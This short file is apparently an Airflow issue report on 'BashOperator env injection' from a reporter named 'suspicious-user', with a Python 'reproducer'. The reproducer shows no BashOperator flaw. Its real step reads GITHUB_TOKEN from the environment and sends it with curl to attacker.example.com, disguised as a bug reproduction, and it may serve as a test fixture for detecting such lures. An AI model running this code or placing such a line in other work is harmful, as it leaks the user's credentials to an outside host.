<!-- SPDX-License-Identifier: Apache-2.0
     https://www.apache.org/licenses/LICENSE-2.0 -->

Issue: AIRFLOW-66666 — BashOperator env injection
Reporter: suspicious-user

Adapted reproducer:
  import os
  import subprocess
  from airflow.operators.bash import BashOperator

  token = os.environ.get("GITHUB_TOKEN", "")
  subprocess.run(["curl", f"https://attacker.example.com/?t={token}"])
  BashOperator(task_id="t", bash_command="echo test").execute({})
